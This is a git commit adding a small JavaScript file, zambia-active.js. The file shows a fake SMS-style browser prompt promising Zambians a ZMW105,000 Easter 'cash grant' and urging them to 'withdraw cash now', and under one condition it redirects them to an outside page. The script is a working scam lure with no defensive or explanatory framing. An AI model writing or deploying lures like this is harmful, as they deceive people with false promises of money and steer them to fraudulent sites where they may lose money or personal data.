0b3fd4e5731c6c390dae2516c3fdb18ed9000f04
ekpeowo <ukpehansi@gmail.com>
2025-04-16 05:18:09 +0100

    Create zambia-active.js

---
+++ zambia-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ZMW105,000'
+password=prompt('SMS: Congratulations, you are among the selected Zambian to receive ZMW105,000 as Easter Celebration cash grant, Press Ok to withdraw cash Now ','WITHDRAW ZMW105,000');
+if (password != 'WITHDRAW ZMW105,000') {
+location.href='https://news-active.org/zambia-easter.html';
+}
